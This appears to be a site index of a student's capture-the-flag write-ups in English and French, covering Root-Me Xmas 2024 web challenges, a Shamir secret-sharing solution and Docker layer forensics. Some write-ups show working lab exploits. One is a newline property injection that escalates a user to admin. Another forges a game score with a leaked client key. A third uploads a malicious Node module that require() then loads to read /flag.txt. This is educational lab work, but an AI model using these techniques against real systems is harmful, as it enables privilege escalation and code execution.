
[{"content":"Hello there !\n","date":"30 December 2024","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":" New new .. always new # We first land on a page that provides the application code. Let\u0026rsquo;s download it and read it. The application is quite simple :\nOne register route which create and store an user : email = request.json.get(\u0026#39;email\u0026#39;) name = request.json.get(\u0026#39;name\u0026#39;) password = request.json.get(\u0026#39;password\u0026#39;) password_hash = generate_password_hash(password) user = User(email=email, name=name, role=\u0026#39;user\u0026#39;, password_hash=password_hash) db.session.add(user) db.session.commit() One login route that checks if the user exists and creates and creates a session cookie using an uuidV4 email = request.json.get(\u0026#39;email\u0026#39;) password = request.json.get(\u0026#39;password\u0026#39;) user = User.query.filter_by(email=email).first() if user and check_password_hash(user.password_hash, password): session_id = create_session(user.email, user.name, user.role) response = make_response(jsonify(success=\u0026#34;Logged in successfully\u0026#34;)) response.set_cookie(\u0026#39;session_id\u0026#39;, session_id) return response The create_session method is used to create a file storing informations about the current user named session_{uuid}.conf.\ndef create_session(email, name, role): session_id = str(uuid.uuid4()) session_file = os.path.join(SESSION_DIR, f\u0026#39;session_{session_id}.conf\u0026#39;) with open(session_file, \u0026#39;w\u0026#39;) as f: f.write(f\u0026#39;email={email}\\n\u0026#39;) f.write(f\u0026#39;role={role}\\n\u0026#39;) f.write(f\u0026#39;name={name}\\n\u0026#39;) return session_id The admin route that check the file created before during the create_session method and read the role to ensure that only the admin is accessing the file. Here is the load_session method that read properties written in the local file : session_data = {} with open(session_file, \u0026#39;r\u0026#39;) as f: for line in f: key, value = line.strip().split(\u0026#39;=\u0026#39;) session_data[key] = value Vulnerability : # In this function, every single line is read. The goal is to overwrite the \u0026lsquo;role\u0026rsquo; of the user (mass assignment) via an \u0026ldquo;injection of properties\u0026rdquo;. To do so, we need to create a user with the following request :\nSince we already know that the name is written after the role in the file, the configuration file should like this\nemail=user@test.com role=user name=user role=admin Then, when the load_session function is called, the role will first be set to \u0026lsquo;user\u0026rsquo; and then set to \u0026lsquo;admin\u0026rsquo;.\nNow you just need to access to the /admin route and read the flag :\nRM{I_Thought_Th1s_VUlnerab1ility_W4s_N0t_Imp0rtant}\n","date":"30 December 2024","externalUrl":null,"permalink":"/wu/root-me-xmas-2024/new-new-..-always-new-day-15/","section":"Write ups","summary":"","title":"Root-me Xmas fifteenth day : New new .. always new","type":"articles"},{"content":" Santa\u0026rsquo;s magick sack # Le site propose un jeu interractif ou le but est d\u0026rsquo;amasser le plus de point en attrapant les cadeaux qui tombe. Le but du jeu est de battre le jouer \u0026ldquo;Santa\u0026rdquo; qui a un score de \u0026hellip; points.\nBien évidemment c\u0026rsquo;est impossible sans tricher !\nL\u0026rsquo;application fonctionne avec du javascript local. A la fin du jeu, l\u0026rsquo;application envoie une requête à l\u0026rsquo;endpoint /score à l\u0026rsquo;aide d\u0026rsquo;une requête POST :\nA première vu, la chaine semblait être encodée en base64 mais celle-ci n\u0026rsquo;est pas lisible lorsqu\u0026rsquo;on la décode. Allons du côté de code source JavaScript quand la requête est envoyée :\nvar Md = hf.exports; const gf = Rf(Md), Ud = \u0026#34;S4NT4_S3CR3T_K3Y_T0_ENCRYPT_DATA\u0026#34;; function Wd(e) { const t = JSON.stringify(e); return gf.AES.encrypt(t, Ud).toString() } function $d(e, t) { const r = Math.floor(Math.random() * 9) + 1, n = `${e}-${t}-${r}`; return { checksum: gf.SHA256(n).toString(), salt: r } } async function Vd(e, t) { const { checksum: r, salt: n } = $d(e, t), l = Wd({ playerName: e, score: t, checksum: r, salt: n }); try { return await ( await fetch(\u0026#34;/api/scores\u0026#34;, { method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34; }, body: JSON.stringify({ data: l }) })).json() } catch (i) { return console.error(\u0026#34;Error submitting score:\u0026#34;, i), { success: !1 } } } Dans l\u0026rsquo;application, le payload est donc envoyé sous cette forme :\n{ playerName: \u0026#39;sidorocs\u0026#39;, score: 150, checksum: \u0026#39;728282e9a412663db774ffd0ca82877f03449c6ff84781b685a7c58de862e4c0\u0026#39;, salt: 3 } et chiffré avec AES 256 grâce à la clé S4NT4_S3CR3T_K3Y_T0_ENCRYPT_DATA.\nDe plus, la somme de contrôle n\u0026rsquo;est ni plus ni moins que le hash SHA256 de la chaine de charactère suivante :\n`${playerName}-${score}-${randomSalt}` En sachant tout ça, il est possible de rejouer le code de génération du payload en changeant le score et enfin de rejouer la requête POST qui envoie le score au backend de l\u0026rsquo;application :\nAnd here\u0026rsquo;s the flag :) RM{S4NT4_H0PE_Y0U_D1DN'T_CHEAT}\n","date":"30 December 2024","externalUrl":null,"permalink":"/wu/root-me-xmas-2024/santas-magick-sack-day-3/","section":"Write ups","summary":"","title":"(French) Root-me Xmas third day : Santa's Magick Sack","type":"articles"},{"content":"","date":"30 December 2024","externalUrl":null,"permalink":"/wu/root-me-xmas-2024/","section":"Write ups","summary":"","title":"Root-me Xmas advent calendar write-up : 1st, 3rd, and 15th day","type":"articles"},{"content":" Generous santa # Le site propose deux fonctions :\nAjouter des cadeaux à sa liste de noël parmi la liste proposée Suggérer une idée de cadeau à ajouter dans la liste Deux fonctions sont proposées sur le site de commande de cadeaux et qu\u0026rsquo;on peut retrouver dans le code source en tant que fonction backend\n/api/suggest\nconst now = new Date(); const dateStr = now.toISOString().split(\u0026#39;T\u0026#39;)[0]; const timeStr = `${now.getHours()}-${now.getMinutes()}-${now.getSeconds()}`; const tempDir = path.join(\u0026#39;/tmp\u0026#39;, `${dateStr}_${timeStr}`); fs.mkdirSync(tempDir, { recursive: true }); const tempPath = path.join(tempDir, req.file.originalname); fs.writeFile(tempPath, req.file.buffer, (err) =\u0026gt; { if (err) { return res.status(500).json({ message: `Error saving the image: ${err.message}` }); } res.json({ message: `Thank you! Santa will consider your suggestion.`, photoPath: tempPath }); }); Qui permet de renseigner un nom de produit au père noël et d\u0026rsquo;uploader une photo du produit dans le répertoire /tmp/\u0026lsquo;date\u0026rsquo;/\u0026lsquo;filename\u0026rsquo;/\n/api/add\nconst Gift = require(`../models/${product.toLowerCase()}`); const gift = new Gift({ name: product, description: `Description of ${product}` }); output = gift.store(); res.json({ success: true, output: output }); Le code appel un template javascript dans le sous-répertoire \u0026lsquo;app path\u0026rsquo;/models/\u0026lsquo;product name\u0026rsquo;.\nEn jouant un peu avec la fonction d\u0026rsquo;upload, on se rend compte qu\u0026rsquo;il n\u0026rsquo;y a aucune restriction sur le type de fichier qu\u0026rsquo;on peut upload.\nEn ayant inspectant les requêtes, on remarque que /api/add renvoie un message de succès plusieurs champs. On va s\u0026rsquo;en servir pour exfiltrer le contenu du flag.\nEn écrivant un module personnalisé, et en l\u0026rsquo;uploadant :\nconst fs = require(\u0026#39;fs\u0026#39;); class Gift { constructor({ name = \u0026#39;Default Gift\u0026#39;, description = \u0026#39;Default Description\u0026#39; } = {}) { this.name = name; this.description = description; } store() { try { const flagContent = fs.readFileSync(\u0026#39;/flag.txt\u0026#39;, \u0026#39;utf8\u0026#39;); return `${flagContent}`; } catch (err) { console.error(\u0026#39;Erreur lors de la lecture de /flag.txt :\u0026#39;, err.message); } return \u0026#34;Une erreur est survenue lors de la lecture du flag :/\u0026#34;; } } module.exports = Gift; Il est possible d\u0026rsquo;éxecuter le code à l\u0026rsquo;aide de cette requête :\nHere\u0026rsquo;s the flag :) RM{Mayb3_S4nt4_Cl4uS_Als0_G3t_A_Flag}\n","date":"30 December 2024","externalUrl":null,"permalink":"/wu/root-me-xmas-2024/generous-santa-day-1/","section":"Write ups","summary":"","title":"(French) Root-me Xmas first day : Generous Santa","type":"articles"},{"content":"Hello there,\nI\u0026rsquo;m Mathieu (sometimes known as Sidorocs on social media), and I\u0026rsquo;m 22 years old. I\u0026rsquo;ve recently graduated from the University of Grenoble Alpes, where I completed a Master\u0026rsquo;s degree in \u0026ldquo;Cybersecurity and Legal Informatics.\u0026rdquo;\nI started learning cybersecurity a little over a year and a half ago, and I’ve become deeply passionate about it. I spend most of my time developing new skills on CTF platforms such as Root-Me and Hack The Box (mainly). I also participate in CTFs, usually on my own, and occasionally create challenges! I\u0026rsquo;m still actively involved in the organization of Securimag (the university\u0026rsquo;s infosec association), where I give talks and help organize CTFs.\nOn this page, you\u0026rsquo;ll find links to my social media and CTF platforms, write-ups for the challenges I\u0026rsquo;ve created, and presentations from my talks.\n","date":"17 November 2024","externalUrl":null,"permalink":"/aboutme/","section":"About me","summary":"","title":"About me","type":"section"},{"content":"As suggested in the challenge description and the source script, the shares.txt file contains a set of shares constructed using Shamir\u0026rsquo;s secret sharing scheme. However, a subtlety lay in the encoding of the secret.\nIndeed, Shamir\u0026rsquo;s secret sharing usually proceeds as follows:\nWe define the following parameters:\nN -\u0026gt; the number of shares k -\u0026gt; a threshold such that k-1 shares are sufficient to reconstruct the secret To generate the shares: We take N distinct points and evaluate the following polynomial for each point:\ns + a_1 * x + a_2 * x^2 + ... + a_k * x^k\nwhere a_i for i from 1 to k are randomly chosen numbers.\nTo recover the secret, we only need k-1 shares to reconstruct the initial polynomial and evaluate it at 0 to recover the secret s.\nIn our case, the degree-0 coefficient is a linear combination of the secret and the a_i\u0026rsquo;s and is specified by the following \u0026rsquo;target vector\u0026rsquo;: [1, 2, 1, 0, 0] This means that the degree-0 coefficient is composed of s + 2 * a_1 + a_2.\nTo recover the secret, we just needed to find the polynomial coefficients and compute the dot product with the target vector:\ndef recover_secret(shares, target_vector, prime=_PRIME): \u0026#34;\u0026#34;\u0026#34; Recover the secret from share points (points (x,y) on the polynomial). \u0026#34;\u0026#34;\u0026#34; if len(shares) \u0026lt; k: raise ValueError(\u0026#34;need at least k shares\u0026#34;) x_s, y_s = zip(*shares) coeffs = lagrange_interpolation_coeffs(x_s, y_s, prime) secret = dot_product(coeffs, target_vector, prime) return number.long_to_bytes(secret) The full solution is available in the solution.py file.\nBy running the script, you will obtain the following output: Recovered secret GH{t4rg3t_v3ct0r_c4n_b3_tr1cky}\n","date":"17 November 2024","externalUrl":null,"permalink":"/wu/gh2024-hide-and-share/","section":"Write ups","summary":"","title":"Grehack 2024 ctf write-up : Hide and Share","type":"articles"},{"content":"","date":"17 November 2024","externalUrl":null,"permalink":"/wu/","section":"Write ups","summary":"","title":"Write ups","type":"section"},{"content":"A talk covering the fundamental aspects of how secret sharing schemes work. We primarily explore the connection between Shamir\u0026rsquo;s secret sharing scheme and linear codes, such as Reed-Solomon codes. Finally, we delve into a more complex topic: how to construct such schemes for any abelian group. These types of schemes are often referred to as Black Box Secret Sharing Schemes.\nSlides available here :\n📥 Visualize the slides here\n","date":"17 November 2024","externalUrl":null,"permalink":"/talk/introduction-to-secret-sharing-schemes/","section":"Talks and presentations","summary":"","title":"How to share a secret - talk given during a Securimag session","type":"section"},{"content":"","date":"17 November 2024","externalUrl":null,"permalink":"/talk/","section":"Talks and presentations","summary":"","title":"Talks and presentations","type":"section"},{"content":" docker layer write up # You first need to pull all the images :\ndocker pull anssi/fcsc2024-forensics-layer-cake-1 docker pull anssi/fcsc2024-forensics-layer-cake-2 docker pull anssi/fcsc2024-forensics-layer-cake-3 If you type :\ndocker images ... anssi/fcsc2024-forensics-layer-cake-1 latest 0faa62781dd1 9 months ago 7.38MB you\u0026rsquo;ll be able to see all the images you pulled.\nFirst layer cake # In docker, layers are the instructions of the Dockerfile used to build the image (they are usually file system changes etc.). You can easily find this layers by processing the command\ndocker hystory anssi/fcsc2024-forensics-layer-cake-1 --no-trunc IMAGE CREATED CREATED BY SIZE COMMENT sha256:0faa62781dd1db0ebb6cd83836bb4ba24f8b58b0cd761ac0cbae426bccc7666f 1 months ago CMD [\u0026#34;/bin/sh\u0026#34;] 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago USER guest 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago ARG FIRST_FLAG=FCSC{a1240d90ebeed7c6c422969ee52xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx} 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago /bin/sh -c #(nop) CMD [\u0026#34;/bin/sh\u0026#34;] 0B \u0026lt;missing\u0026gt; 1 months ago /bin/sh -c #(nop) ADD file:37a76ec18f9887751cd8473744917d08b7431fc4085097bb6a09d81b41775473 in / 7.38MB so here\u0026rsquo;s our first flag :) !\nSecond layer cake # If you retry the same command as in the first challenge, you\u0026rsquo;ll see something close to that :\nIMAGE CREATED CREATED BY SIZE COMMENT sha256:03014d9fc4801b1810b112fd53e05e35ea127e55c82d1304b5622cfe257c0ad8 1 months ago CMD [\u0026#34;/bin/sh\u0026#34;] 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago USER guest 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago RUN /bin/sh -c rm /tmp/secret # buildkit 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago COPY secret /tmp # buildkit 71B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago /bin/sh -c #(nop) CMD [\u0026#34;/bin/sh\u0026#34;] 0B \u0026lt;missing\u0026gt; 1 months ago /bin/sh -c #(nop) ADD file:37a76ec18f9887751cd8473744917d08b7431fc4085097bb6a09d81b41775473 in / 7.38MB As we can see, a secret has been copied in the /tmp folder but we can\u0026rsquo;t access it only with this command. No we will need to \u0026ldquo;dive\u0026rdquo; further into the file system of each layer. To do so, we can use the tool dive :\nAs we can see, we can navigate through the layers of the image consulting the structure of the file system. From here, we can see that a file named secret has been placed into the /tmp folder.\nNow the goal is to extract that file ! Let us inspect the image with docker inspect. The interesting field is GraphDriver.Data.LowerDir which list the folder containing the difference of the file system of all older layers.\nSeeing this :\n\u0026#34;Data\u0026#34;: { \u0026#34;LowerDir\u0026#34;: \u0026#34;/var/lib/docker/overlay2/643b1a02362f1cef26f01cc94c3b9a0ee5fb8b429ce3b1511194b9cf0a7bd1b2/diff:/var/lib/docker/overlay2/fbbfa9fff3f5a67da15ef066aa4c83066a02ddebab95de67c6b47bddf2fe05d3/diff\u0026#34;, we can deduce that the file system difference is located in the `` folder, and cat the secret :\nroot@MathieuDebian:/var/lib/docker/overlay2/643b1a02362f1cef26f01cc94c3b9a0ee5fb8b429ce3b1511194b9cf0a7bd1b2/diff/tmp# pwd /var/lib/docker/overlay2/643b1a02362f1cef26f01cc94c3b9a0ee5fb8b429ce3b1511194b9cf0a7bd1b2/diff/tmp root@MathieuDebian:/var/lib/docker/overlay2/643b1a02362f1cef26f01cc94c3b9a0ee5fb8b429ce3b1511194b9cf0a7bd1b2/diff/tmp# cat secret FCSC{b38095916b2b578109cbf35b8be713b04a64b2b2dxxxxxxxxxxxxxxxxxxxxxxxx} Here\u0026rsquo;s the second flag !\nthird layer cake # Again, let\u0026rsquo;s pull and inspect our image. We can see this line indicating the folder where all the data related to the docker image is stored.\n\u0026#34;UpperDir\u0026#34;: \u0026#34;/var/lib/docker/overlay2/eea95c7208f138a8c449ecbbfc64874d130f20e8a3239a389aaa69c4df797974/diff\u0026#34; let\u0026rsquo;s get into this folder and execute the command\nroot@MathieuDebian:/var/lib/docker/overlay2/eea95c7208f138a8c449ecbbfc64874d130f20e8a3239a389aaa69c4df797974/diff# grep -r FCSC{ nix/store/m8ww0n3iqndg8zaiwbsnij6rvmpmjbry-hello/bin/hello:exec /nix/store/rnxji3jf6fb0nx2v0svdqpj9ml53gyqh-hello-2.12.1/bin/hello -g \u0026#34;FCSC{c12d9a48f1635354fe9c32b216f144ac66f7b8466a5ac82a35aa385964ccbb61}\u0026#34; -t Once again, here\u0026rsquo;s the flag !\n","date":"20 February 2024","externalUrl":null,"permalink":"/wu/fscs2024-layer-cake1-2-3/","section":"Write ups","summary":"","title":"FCSC 2024 : write for the challenges layer cake 1, 2 and 3","type":"section"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]